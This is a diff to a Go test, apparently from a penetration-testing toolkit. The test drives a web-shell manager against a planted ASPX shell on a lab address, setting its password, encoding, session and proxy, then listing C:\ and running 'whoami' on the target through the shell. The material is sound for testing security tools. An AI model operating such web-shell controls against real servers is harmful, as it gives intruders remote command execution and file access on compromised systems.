@@ -523,31 +523,43 @@ func TestInjectWebappComponent(t *testing.T) {
 
 func TestYakShellJsp(t *testing.T) {
 	//url := "http://localhost:8080/tomcat_war_exploded/el.jsp"
-	//url := "http://localhost:8080/tomcat_war_exploded/sessionEvil2.jsp"
+	//url := "http://127.0.0.1:8080/tomcat_war_exploded/sessionEvil2.jsp"
 	//url := "http://127.0.0.1:8093/123321.php"
 	url := "http://10.211.55.3:8076/testsession.aspx"
+	//url := "http://10.211.55.3:8076/shell.aspx"
 	manager, err := NewYakShellManager(url,
 		SetYakShellTool(),
 		SetPass("1"),
-		SetPosts(map[string]string{"test": "test"}),
 		SetBase64(),
 		SetShellScript(ypb.ShellScript_ASPX.String()),
-		SetProxy("http://127.0.0.1:8922"),
+		SetProxy("http://127.0.0.1:8083"),
 		SetTimeout(10),
-		SetBase64Dec(),
 		SetSession(),
+		//SetBase64Dec(),
+		//SetPosts(map[string]string{"test": "test"}),
 	)
 	if err != nil {
 		panic(err)
 	}
-	ping, err := manager.Ping()
+	//ping, err := manager.("whoami")
+	//if err != nil {
+	//	panic(err)
+	//}
+	//fmt.Println(ping)
+	ping, err := manager.ExecutePluginOrCache(map[string]string{
+		"mode": "DirInfo",
+		"path": "C:\\",
+	})
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(ping)
-	exec, err := manager.CommandExec("whoami")
+	fmt.Println(string(ping))
+	ping, err = manager.ExecutePluginOrCache(map[string]string{
+		"mode": "DirInfo",
+		"path": "C:\\",
+	})
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(string(exec))
+	fmt.Println(string(ping))
 }
